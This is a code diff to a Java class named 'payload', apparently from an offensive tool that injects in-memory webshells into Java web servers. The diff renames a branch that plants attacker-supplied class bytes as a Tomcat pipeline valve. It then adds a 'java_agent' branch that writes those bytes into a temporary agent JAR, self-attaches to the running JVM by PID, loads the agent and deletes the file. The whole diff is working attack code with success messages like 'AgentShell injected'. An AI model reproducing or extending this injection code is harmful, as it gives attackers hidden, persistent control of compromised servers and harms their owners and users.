@@ -196,7 +196,7 @@ public class payload {
                     return "[!] WARN: Interceptor class already hooked.";
                 }
             }
-            else if ("java_agent".equalsIgnoreCase(szShellType)) {
+            else if ("tomcat_valve".equalsIgnoreCase(szShellType)) {
                 Object pipeline = standardContext.getClass().getMethod("getPipeline", new Class[0]).invoke(standardContext, new Object[0]);
                 if (pipeline != null) {
                     Class<?> valveClass = (Class<?>) defineClassMethod.invoke(sandboxLoader, new Object[]{realClassBytes, 0, realClassBytes.length});
@@ -220,6 +220,41 @@ public class payload {
                     }
                 } else {
                     return "[-] ERROR: Tomcat basic engine pipeline is unavailable.";
+                }
+            }
+            else if ("java_agent".equalsIgnoreCase(szShellType)) {
+                try {
+                    Class<?> managementFactoryClass = Class.forName("java.lang.management.ManagementFactory");
+                    Object runtimeMxBean = managementFactoryClass.getMethod("getRuntimeMXBean", new Class[0]).invoke(null);
+                    String name = (String) runtimeMxBean.getClass().getMethod("getName", new Class[0]).invoke(runtimeMxBean);
+                    String pid = name.split("@")[0];
+
+                    if (szClassName.isEmpty()) {
+                        szClassName = "AgentShell";
+                    }
+
+                    java.io.File jarFile = java.io.File.createTempFile("payload_agent", ".jar");
+                    java.util.jar.Manifest manifest = new java.util.jar.Manifest();
+                    manifest.getMainAttributes().put(java.util.jar.Attributes.Name.MANIFEST_VERSION, "1.0");
+                    manifest.getMainAttributes().put(new java.util.jar.Attributes.Name("Agent-Class"), szClassName);
+                    manifest.getMainAttributes().put(new java.util.jar.Attributes.Name("Can-Redefine-Classes"), "true");
+                    manifest.getMainAttributes().put(new java.util.jar.Attributes.Name("Can-Retransform-Classes"), "true");
+
+                    try (java.util.jar.JarOutputStream jos = new java.util.jar.JarOutputStream(new java.io.FileOutputStream(jarFile), manifest)) {
+                        jos.putNextEntry(new java.util.jar.JarEntry(szClassName + ".class"));
+                        jos.write(realClassBytes);
+                        jos.closeEntry();
+                    }
+
+                    Class<?> vmClass = Class.forName("com.sun.tools.attach.VirtualMachine");
+                    Object vm = vmClass.getMethod("attach", String.class).invoke(null, pid);
+                    vmClass.getMethod("loadAgent", String.class, String.class).invoke(vm, jarFile.getAbsolutePath(), "");
+                    vmClass.getMethod("detach", new Class[0]).invoke(vm);
+                    
+                    jarFile.delete();
+                    return "[+] SUCCESS: Java Agent [" + szClassName + "] injected via PID " + pid + "!";
+                } catch (Exception ex) {
+                    return "[-] ERROR: Failed to execute Java Agent routine: " + ex.toString();
                 }
             }
 
